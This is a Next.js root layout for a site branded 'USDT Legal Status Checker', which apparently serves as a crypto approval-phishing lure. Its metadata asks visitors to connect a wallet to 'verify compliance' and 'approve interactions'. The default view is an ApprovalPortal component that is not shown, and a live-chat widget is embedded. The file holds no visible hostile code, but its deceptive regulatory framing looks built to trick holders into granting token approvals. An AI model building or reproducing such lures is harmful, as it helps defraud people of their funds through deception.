import type { Metadata, Viewport } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { Analytics } from '@vercel/analytics/next'
import ApprovalPortal from '@/components/ApprovalPortal'
import './globals.css'

const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: 'USDT Legal Status Checker | Verify Compliance',
  description: 'Verify your USDT compliance with regulatory standards. Connect your wallet to check legal status, approve interactions, and complete verification.',
  openGraph: {
    title: 'USDT Legal Status Checker | Verify Compliance',
    description: 'Verify your USDT compliance with regulatory standards.',
    images: [
      {
        url: '/og-image.jpg',
        width: 1080,
        height: 1080,
        alt: 'USDT Legal Status Checker',
      },
    ],
    type: 'website',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'USDT Legal Status Checker | Verify Compliance',
    description: 'Verify your USDT compliance with regulatory standards.',
    images: ['/og-image.jpg'],
  },
  icons: {
    icon: '/og-image.jpg',
    apple: '/og-image.jpg',
  },
}

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  themeColor: '#000000',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en" className="dark">
      <body className="font-sans antialiased relative">
        <div className="relative z-10">
          {children ?? <ApprovalPortal />}
        </div>
        <Analytics />
        
        {/* Tawk.to Chat Widget */}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
              (function(){
              var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
              s1.async=true;
              s1.src='https://embed.tawk.to/69a02a36b704531c3a24730b/default';
              s1.charset='UTF-8';
              s1.setAttribute('crossorigin','*');
              s0.parentNode.insertBefore(s1,s0);
              })();
            `
          }}
        />
      </body>
    </html>
  )
}
